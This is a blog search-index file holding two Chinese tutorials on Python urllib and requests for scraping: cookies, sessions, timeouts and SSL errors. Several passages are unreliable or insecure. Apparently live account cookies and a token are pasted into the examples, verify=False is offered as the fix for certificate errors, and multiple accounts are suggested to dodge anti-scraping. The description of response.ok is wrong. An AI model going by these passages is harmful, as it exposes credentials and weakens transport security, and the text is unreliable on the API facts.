<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>urllib与requests2</title>
      <link href="/2023/12/28/urllib%E4%B8%8Erequests2/"/>
      <url>/2023/12/28/urllib%E4%B8%8Erequests2/</url>
      
        <content type="html"><![CDATA[<h2 id="三、requests模块处理cookie相关的请求"><a href="#三、requests模块处理cookie相关的请求" class="headerlink" title="三、requests模块处理cookie相关的请求"></a>三、requests模块处理cookie相关的请求</h2><p><strong>学习目标</strong></p><p>掌握requests处理cookie的三种方法</p><h3 id="1-爬虫中使用cookie"><a href="#1-爬虫中使用cookie" class="headerlink" title="1 爬虫中使用cookie"></a>1 爬虫中使用cookie</h3><blockquote><p>为了能够通过爬虫获取到登录后的页面，或者是解决通过cookie的反扒，需要使用request来处理cookie相关的请求</p></blockquote><h5 id="1-1-爬虫中使用cookie的利弊"><a href="#1-1-爬虫中使用cookie的利弊" class="headerlink" title="1.1 爬虫中使用cookie的利弊"></a>1.1 爬虫中使用cookie的利弊</h5><ul><li>带上cookie的好处<ul><li>能够访问登录后的页面</li><li>能够实现部分反反爬</li></ul></li><li>带上cookie的坏处<ul><li>一套cookie往往对应的是一个用户的信息，请求太频繁有更大的可能性被对方识别为爬虫</li><li>那么上面的问题如何解决 ?使用多个账号</li></ul></li></ul><h5 id="1-2-requests处理cookie的方法"><a href="#1-2-requests处理cookie的方法" class="headerlink" title="1.2 requests处理cookie的方法"></a>1.2 requests处理cookie的方法</h5><p>使用requests处理cookie有三种方法：</p><ul><li>cookie字符串放在headers中</li><li>把cookie字典放传给请求方法的cookies参数接收</li><li>使用requests提供的session模块</li></ul><h3 id="2、cookie添加在heades中"><a href="#2、cookie添加在heades中" class="headerlink" title="2、cookie添加在heades中"></a>2、cookie添加在heades中</h3><h5 id="2-1-headers中cookie的位置"><a href="#2-1-headers中cookie的位置" class="headerlink" title="2.1 headers中cookie的位置"></a>2.1 headers中cookie的位置</h5><p><img src="/../images/requests.assets/headers%E4%B8%AD%E7%9A%84cookie.png" alt="headers中的cookie"></p><ul><li>headers中的cookie：<ul><li>使用分号(;)隔开</li><li>分号两边的类似a&#x3D;b形式的表示一条cookie</li><li>a&#x3D;b中，a表示键（name），b表示值（value）</li><li>在headers中仅仅使用了cookie的name和value</li></ul></li></ul><h5 id="2-2-cookie的具体组成的字段"><a href="#2-2-cookie的具体组成的字段" class="headerlink" title="2.2 cookie的具体组成的字段"></a>2.2 cookie的具体组成的字段</h5><p><img src="/../images/requests.assets/cookie%E7%9A%84%E5%85%B7%E4%BD%93%E5%AD%97%E6%AE%B5.png" alt="cookie的具体字段"></p><p>由于headers中对cookie仅仅使用它的name和value，所以在代码中我们仅仅需要cookie的name和value即可</p><h5 id="2-3-在headers中使用cookie"><a href="#2-3-在headers中使用cookie" class="headerlink" title="2.3 在headers中使用cookie"></a>2.3 在headers中使用cookie</h5><p>复制浏览器中的cookie到代码中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36&quot;</span>,</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot; Pycharm-26c2d973=dbb9b300-2483-478f-9f5a-16ca4580177e; Hm_lvt_98b9d8c2fd6608d564bf2ac2ae642948=1512607763; Pycharm-26c2d974=f645329f-338e-486c-82c2-29e2a0205c74; _xsrf=2|d1a3d8ea|c5b07851cbce048bd5453846445de19d|1522379036&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">requests.get(url,headers=headers)</span><br></pre></td></tr></table></figure><h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><p>cookie有过期时间 ，所以直接复制浏览器中的cookie可能意味着下一程序继续运行的时候需要替换代码中的cookie，对应的我们也可以通过一个程序专门来获取cookie供其他程序使用；当然也有很多网站的cookie过期时间很长，这种情况下，直接复制cookie来使用更加简单</p><h3 id="3、使用cookies参数接收字典形式的cookie"><a href="#3、使用cookies参数接收字典形式的cookie" class="headerlink" title="3、使用cookies参数接收字典形式的cookie"></a>3、使用cookies参数接收字典形式的cookie</h3><ul><li>cookies的形式：字典</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookies = <span class="punctuation">&#123;</span><span class="attr">&quot;cookie的name&quot;</span><span class="punctuation">:</span><span class="string">&quot;cookie的value&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>使用方法：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url,headers=headers,cookies=cookie_dict)</span><br></pre></td></tr></table></figure><ul><li><p>实例（爬取雪球网）</p><p>在网络中找到当前请求的网址 点击cookies 将当前的k,value复制到代码中</p><p><img src="/../images/requests.assets/image-20220420190426741.png" alt="image-20220420190426741"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cookie_dict = &#123;</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;1990923459&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bid&#x27;</span>: <span class="string">&#x27;1f110dfd43538f4b8362dfcd21ffbb64_l27g4lfl&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xq_is_login&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xq_r_token&#x27;</span>: <span class="string">&#x27;5dcbe83944f0b75325f91246061d4a2a01999367&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 携带cookie登录雪球网  抓取完善个人资料页面</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://xueqiu.com/u/1990923459&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;xueqiu.com&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&#x27;https://xueqiu.com/users/connectnew?redirect=/setting/user&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie_dict = &#123;</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;1990923459&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bid&#x27;</span>: <span class="string">&#x27;1f110dfd43538f4b8362dfcd21ffbb64_l27g4lfl&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xq_is_login&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;xq_r_token&#x27;</span>: <span class="string">&#x27;5dcbe83944f0b75325f91246061d4a2a01999367&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url, headers=headers, cookies=cookie_dict)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;雪球网.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(res.content.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(res.content.decode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>成果</p><p><img src="/../images/requests.assets/image-20220420190612671.png" alt="image-20220420190612671"></p></li></ul><h3 id="4、使用requests-session处理cookie"><a href="#4、使用requests-session处理cookie" class="headerlink" title="4、使用requests.session处理cookie"></a>4、使用requests.session处理cookie</h3><blockquote><p>前面使用手动的方式使用cookie，那么有没有更好的方法在requets中处理cookie呢？</p></blockquote><p>requests 提供了一个叫做session类，来实现客户端和服务端的<code>会话保持</code></p><p>会话保持有两个内涵：</p><ul><li>保存cookie，下一次请求会带上前一次的cookie</li><li>实现和服务端的长连接，加快请求速度</li></ul><h5 id="4-1-使用方法"><a href="#4-1-使用方法" class="headerlink" title="4.1 使用方法"></a>4.1 使用方法</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session = requests.session()</span><br><span class="line">response = session.get(url,headers)</span><br></pre></td></tr></table></figure><p>session实例在请求了一个网站后，对方服务器设置在本地的cookie会保存在session中，下一次再使用session请求对方服务器的时候，会带上前一次的cookie</p><h5 id="4-2-动手练习：模拟登陆"><a href="#4-2-动手练习：模拟登陆" class="headerlink" title="4.2 动手练习：模拟登陆"></a>4.2 动手练习：模拟登陆</h5><ul><li><p>17k小说网    <a href="https://passport.17k.com/">https://passport.17k.com/</a></p></li><li><p>古诗文：<a href="https://so.gushiwen.cn/">https://so.gushiwen.cn</a></p></li><li><p>打码平台  </p><p>图鉴   <a href="http://www.ttshitu.com/">http://www.ttshitu.com/</a></p></li></ul><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><ol><li>准备url地址和请求参数</li><li>构造session发送post请求</li><li>使用session请求个人主页，观察是否请求成功</li></ol><h3 id="5、小结"><a href="#5、小结" class="headerlink" title="5、小结"></a>5、小结</h3><ol><li>cookie字符串可以放在headers字典中，键为Cookie，值为cookie字符串</li><li>可以把cookie字符串转化为字典，使用请求方法的cookies参数接收</li><li>使用requests提供的session模块，能够自动实现cookie的处理，包括请求的时候携带cookie，获取响应的时候保存cookie</li></ol><h2 id="四、requests模块的其他方法"><a href="#四、requests模块的其他方法" class="headerlink" title="四、requests模块的其他方法"></a>四、requests模块的其他方法</h2><h5 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h5><ol><li>掌握requests中cookirJar的处理方法</li><li>掌握requests解决https证书错误的问题</li><li>掌握requests中超时参数的使用</li></ol><h3 id="1、requests中cookirJar的处理方法"><a href="#1、requests中cookirJar的处理方法" class="headerlink" title="1、requests中cookirJar的处理方法"></a>1、requests中cookirJar的处理方法</h3><blockquote><p>使用request获取的resposne对象，具有cookies属性，能够获取对方服务器设置在本地的cookie，但是如何使用这些cookie呢？</p></blockquote><h5 id="1-1-方法介绍"><a href="#1-1-方法介绍" class="headerlink" title="1.1 方法介绍"></a>1.1 方法介绍</h5><ol><li>response.cookies是CookieJar类型</li><li>使用requests.utils.dict_from_cookiejar，能够实现把cookiejar对象转化为字典</li></ol><h5 id="1-2-方法展示"><a href="#1-2-方法展示" class="headerlink" title="1.2 方法展示"></a>1.2 方法展示</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"><span class="comment">#发送请求，获取resposne</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(response.cookies))</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用方法从cookiejar中提取数据  等同于  dict(response.cookies)</span></span><br><span class="line">cookies = requests.utils.dict_from_cookiejar(response.cookies)</span><br><span class="line"><span class="built_in">print</span>(cookies)</span><br></pre></td></tr></table></figure><p>输出为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;requests.cookies.RequestsCookieJar&#x27;</span>&gt;</span><br><span class="line">&#123;<span class="string">&#x27;BDORZ&#x27;</span>: <span class="string">&#x27;27315&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><h5 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h5><p>在前面的requests的session类中，我们不需要处理cookie的任何细节，如果有需要，我们可以使用上述方法来解决</p><h3 id="2、requests处理证书错误"><a href="#2、requests处理证书错误" class="headerlink" title="2、requests处理证书错误"></a>2、requests处理证书错误</h3><blockquote><p>经常我们在网上冲浪时，经常能够看到下面的提示：</p></blockquote><p><img src="/../images/requests.assets/12306ssl%E9%94%99%E8%AF%AF.png" alt="12306ssl错误"></p><p>出现这个问题的原因是：ssl的证书不安全导致</p><h5 id="2-1-代码中发起请求的效果"><a href="#2-1-代码中发起请求的效果" class="headerlink" title="2.1 代码中发起请求的效果"></a>2.1 代码中发起请求的效果</h5><p>那么如果在代码中请求会怎么样呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.12306.cn/mormhweb/&quot;</span></span><br><span class="line">response = requests.get(url)</span><br></pre></td></tr></table></figure><p>返回证书错误，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssl.CertificateError ...</span><br></pre></td></tr></table></figure><h5 id="2-2-解决方案"><a href="#2-2-解决方案" class="headerlink" title="2.2 解决方案"></a>2.2 解决方案</h5><p>为了在代码中能够正常的请求，我们修改添加一个参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.12306.cn/mormhweb/&quot;</span></span><br><span class="line">response = requests.get(url, verify=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3 id="3、超时参数的使用"><a href="#3、超时参数的使用" class="headerlink" title="3、超时参数的使用"></a>3、超时参数的使用</h3><blockquote><p>在平时网上冲浪的过程中，我们经常会遇到网络波动，这个时候，一个请求等了很久可能任然没有结果</p><p>在爬虫中，一个请求很久没有结果，就会让整个项目的效率变得非常低，这个时候我们就需要对请求进行强制要求，让他必须在特定的时间内返回结果，否则就报错</p></blockquote><h5 id="3-1-超时参数使用方法如下："><a href="#3-1-超时参数使用方法如下：" class="headerlink" title="3.1 超时参数使用方法如下："></a>3.1 超时参数使用方法如下：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response = requests.get(url,timeout=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>通过添加timeout参数，能够保证在3秒钟内返回响应，否则会报错</p><h5 id="注意：-2"><a href="#注意：-2" class="headerlink" title="注意："></a>注意：</h5><p>这个方法还能够拿来检测代理ip的质量，如果一个代理ip在很长时间没有响应，那么添加超时之后也会报错，对应的这个ip就可以从代理ip池中删除</p>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>urllib与requests1</title>
      <link href="/2023/12/28/urllib%E4%B8%8Erequests1/"/>
      <url>/2023/12/28/urllib%E4%B8%8Erequests1/</url>
      
        <content type="html"><![CDATA[<h1 id="urllib与requests"><a href="#urllib与requests" class="headerlink" title="urllib与requests"></a>urllib与requests</h1><h2 id="一、urllib的学习"><a href="#一、urllib的学习" class="headerlink" title="一、urllib的学习"></a>一、urllib的学习</h2><h5 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h5><p>了解urllib的基本使用 </p><hr><h3 id="1、urllib介绍"><a href="#1、urllib介绍" class="headerlink" title="1、urllib介绍"></a>1、urllib介绍</h3><p>除了requests模块可以发送请求之外, urllib模块也可以实现请求的发送,只是操作方法略有不同!</p><p>urllib在python中分为urllib和urllib2，在python3中为urllib</p><p>下面以python3的urllib为例进行讲解</p><h3 id="2、urllib的基本方法介绍"><a href="#2、urllib的基本方法介绍" class="headerlink" title="2、urllib的基本方法介绍"></a>2、urllib的基本方法介绍</h3><h4 id="2-1-urllib-Request"><a href="#2-1-urllib-Request" class="headerlink" title="2.1 urllib.Request"></a>2.1 urllib.Request</h4><ol><li><p>构造简单请求</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment">#构造请求</span></span><br><span class="line">request = urllib.request.Request(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">#发送请求获取响应</span></span><br><span class="line">response = urllib.request.urlopen(request)</span><br></pre></td></tr></table></figure></li><li><p>传入headers参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment">#构造headers</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span> : <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;</span>&#125; </span><br><span class="line"><span class="comment">#构造请求</span></span><br><span class="line">request = urllib.request.Request(url, headers = headers)</span><br><span class="line"><span class="comment">#发送请求</span></span><br><span class="line">response = urllib.request.urlopen(request)</span><br></pre></td></tr></table></figure></li><li><p>传入data参数 实现发送post请求（示例）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://ifanyi.iciba.com/index.php?c=trans&amp;m=fy&amp;client=6&amp;auth_user=key_ciba&amp;sign=99730f3bf66b2582&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;zh&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;to&#x27;</span>: <span class="string">&#x27;en&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;lucky 是一个帅气的老&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 使用post方式</span></span><br><span class="line"><span class="comment"># 需要</span></span><br><span class="line">data = urllib.parse.urlencode(data).encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">req = urllib.request.Request(url, data=data, headers=headers)</span><br><span class="line">res = urllib.request.urlopen(req)</span><br><span class="line"><span class="built_in">print</span>(res.getcode())</span><br><span class="line"><span class="built_in">print</span>(res.geturl())</span><br><span class="line">data = json.loads(res.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure></li></ol><h4 id="2-2-response-read"><a href="#2-2-response-read" class="headerlink" title="2.2 response.read()"></a>2.2 response.read()</h4><p>获取响应的html字符串,bytes类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#发送请求</span></span><br><span class="line">response = urllib.request.urlopen(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line"><span class="comment">#获取响应</span></span><br><span class="line">response.read()</span><br></pre></td></tr></table></figure><h3 id="3、urllib请求百度首页的完整例子"><a href="#3、urllib请求百度首页的完整例子" class="headerlink" title="3、urllib请求百度首页的完整例子"></a>3、urllib请求百度首页的完整例子</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://www.baidu.com&#x27;</span></span><br><span class="line"><span class="comment">#构造headers</span></span><br><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span> : <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;</span>&#125;</span><br><span class="line"><span class="comment">#构造请求</span></span><br><span class="line">request = urllib.request.Request(url, headers = headers)</span><br><span class="line"><span class="comment">#发送请求</span></span><br><span class="line">response = urllib.request.urlopen(request)</span><br><span class="line"><span class="comment">#获取html字符串</span></span><br><span class="line">html_str = response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(html_str)</span><br></pre></td></tr></table></figure><h3 id="4、小结"><a href="#4、小结" class="headerlink" title="4、小结"></a>4、小结</h3><ol><li>urllib.request中实现了构造请求和发送请求的方法</li><li>urllib.request.Request(url,headers,data)能够构造请求</li><li>urllib.request.urlopen能够接受request请求或者url地址发送请求，获取响应</li><li>response.read()能够实现获取响应中的bytes字符串</li></ol><h1 id="requests模块的入门使用"><a href="#requests模块的入门使用" class="headerlink" title="requests模块的入门使用"></a>requests模块的入门使用</h1><h2 id="一、requests模块的入门使用"><a href="#一、requests模块的入门使用" class="headerlink" title="一、requests模块的入门使用"></a>一、requests模块的入门使用</h2><h5 id="学习目标："><a href="#学习目标：" class="headerlink" title="学习目标："></a>学习目标：</h5><ol><li>了解 requests模块的介绍</li><li>掌握 requests的基本使用</li><li>掌握 response常见的属性</li><li>掌握 requests.text和content的区别</li><li>掌握 解决网页的解码问题</li><li>掌握 requests模块发送带headers的请求</li><li>掌握 requests模块发送带参数的get请求</li></ol><hr><h3 id="1、为什么要重点学习requests模块，而不是urllib"><a href="#1、为什么要重点学习requests模块，而不是urllib" class="headerlink" title="1、为什么要重点学习requests模块，而不是urllib"></a>1、为什么要重点学习requests模块，而不是urllib</h3><ul><li>企业中用的最多的就是requests</li><li>requests的底层实现就是urllib</li><li>requests在python2 和python3中通用，方法完全一样</li><li>requests简单易用</li></ul><h3 id="2、requests的作用与安装"><a href="#2、requests的作用与安装" class="headerlink" title="2、requests的作用与安装"></a>2、requests的作用与安装</h3><p>作用：发送网络请求，返回响应数据</p><p>安装：pip install requests</p><h3 id="3、requests模块发送简单的get请求、获取响应"><a href="#3、requests模块发送简单的get请求、获取响应" class="headerlink" title="3、requests模块发送简单的get请求、获取响应"></a>3、requests模块发送简单的get请求、获取响应</h3><p>需求：通过requests向百度首页发送请求，获取百度首页的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标url</span></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 向目标url发送get请求</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印响应内容</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><strong>response的常用属性：</strong></p><ul><li><p><code>response.text</code> 响应体 str类型</p></li><li><p><code>response.encoding</code>  从HTTP　header中猜测的响应内容的编码方式</p></li><li><p><code>respones.content</code> 响应体 bytes类型</p></li><li><p><code>response.status_code</code> 响应状态码</p></li><li><p><code>response.request.headers</code> 响应对应的请求头</p></li><li><p><code>response.headers</code> 响应头</p></li><li><p><code>response.cookies</code> 响应的cookie（经过了set-cookie动作）</p></li><li><p><code>response.url </code> 获取访问的url</p></li><li><p><code>response.json()</code>  获取json数据 得到内容为字典 (如果接口响应体的格式是json格式时)</p></li><li><p><code>response.ok</code> </p><p>如果status_code小于200，response.ok返回True。</p><p>如果status_code大于200，response.ok返回False。</p></li></ul><p><strong>思考：text是response的属性还是方法呢？</strong></p><ul><li>一般来说名词，往往都是对象的属性，对应的动词是对象的方法</li></ul><h5 id="3-1-response-text-和response-content的区别"><a href="#3-1-response-text-和response-content的区别" class="headerlink" title="3.1 response.text 和response.content的区别"></a>3.1 response.text 和response.content的区别</h5><ul><li><code>response.text</code><ul><li>类型：str</li><li>解码类型： requests模块自动根据HTTP 头部对响应的编码作出有根据的推测，推测的文本编码</li><li>如何修改编码方式：<code>response.encoding=&quot;gbk/UTF-8&quot;</code></li></ul></li><li><code>response.content</code><ul><li>类型：bytes</li><li>解码类型： 没有指定</li><li>如何修改编码方式：<code>response.content.deocde(&quot;utf8&quot;)</code></li></ul></li></ul><p>获取网页源码的通用方式：</p><ol><li><code>response.content.decode()</code></li><li><code>response.content.decode(&quot;UTF-8&quot;)</code></li><li><code>response.text</code></li></ol><p>以上三种方法从前往后尝试，能够100%的解决所有网页解码的问题</p><p>所以：更推荐使用<code>response.content.deocde()</code>的方式获取响应的html页面</p><h5 id="3-2-练习：把网络上的图片保存到本地"><a href="#3-2-练习：把网络上的图片保存到本地" class="headerlink" title="3.2 练习：把网络上的图片保存到本地"></a>3.2 练习：把网络上的图片保存到本地</h5><blockquote><p>我们来把<code>www.baidu.com</code>的图片保存到本地</p></blockquote><p><strong>思考：</strong></p><ul><li>以什么方式打开文件</li><li>保存什么格式的内容</li></ul><p><strong>分析：</strong></p><ul><li>图片的url: <a href="https://www.baidu.com/img/bd_logo1.png">https://www.baidu.com/img/bd_logo1.png</a></li><li>利用requests模块发送请求获取响应</li><li>以2进制写入的方式打开文件，并将response响应的二进制内容写入</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片的url</span></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com/img/bd_logo1.png&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 响应本身就是一个图片,并且是二进制类型</span></span><br><span class="line">response = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(response.content)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以二进制+写入的方式打开文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;baidu.png&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="comment"># 写入response.content bytes二进制类型</span></span><br><span class="line">    f.write(response.content)</span><br></pre></td></tr></table></figure><h3 id="4、发送带header的请求"><a href="#4、发送带header的请求" class="headerlink" title="4、发送带header的请求"></a>4、发送带header的请求</h3><blockquote><p>我们先写一个获取百度首页的代码</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 